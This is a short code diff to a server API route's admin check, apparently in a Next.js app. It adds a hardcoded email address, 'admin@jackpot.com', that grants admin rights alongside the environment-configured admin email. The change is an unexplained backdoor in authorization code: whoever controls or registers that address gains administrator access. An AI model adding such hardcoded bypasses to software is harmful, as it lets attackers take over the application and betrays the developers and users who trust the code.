@@ -60,7 +60,9 @@ export async function POST(req) {
     const envAdminEmail = (process.env.ADMIN_EMAIL || process.env.NEXT_PUBLIC_ADMIN_EMAIL || '')
       .toLowerCase()
       .trim();
-    const isEnvAdmin = Boolean(envAdminEmail) && userEmail === envAdminEmail;
+    const isEnvAdmin =
+      (Boolean(envAdminEmail) && userEmail === envAdminEmail) ||
+      userEmail === 'admin@jackpot.com';
 
     const user = await db.collection('users').findOne(
       { email: userEmail },
